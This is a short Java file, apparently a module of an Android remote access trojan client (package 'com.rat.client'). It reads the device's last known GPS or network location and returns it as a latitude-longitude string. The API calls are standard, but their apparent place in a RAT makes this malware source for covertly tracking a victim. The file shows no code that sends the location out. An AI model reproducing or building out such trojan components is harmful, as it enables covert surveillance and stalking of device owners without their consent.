package com.rat.client;

import android.content.Context;
import android.location.LocationManager;

public class Location {
    public static String get(Context ctx) {
        try {
            LocationManager lm = (LocationManager)
                ctx.getSystemService(Context.LOCATION_SERVICE);
            android.location.Location l = lm.getLastKnownLocation(
                LocationManager.GPS_PROVIDER);
            if (l == null) l = lm.getLastKnownLocation(
                LocationManager.NETWORK_PROVIDER);
            if (l == null) return "no location";
            return l.getLatitude() + "," + l.getLongitude();
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }
}
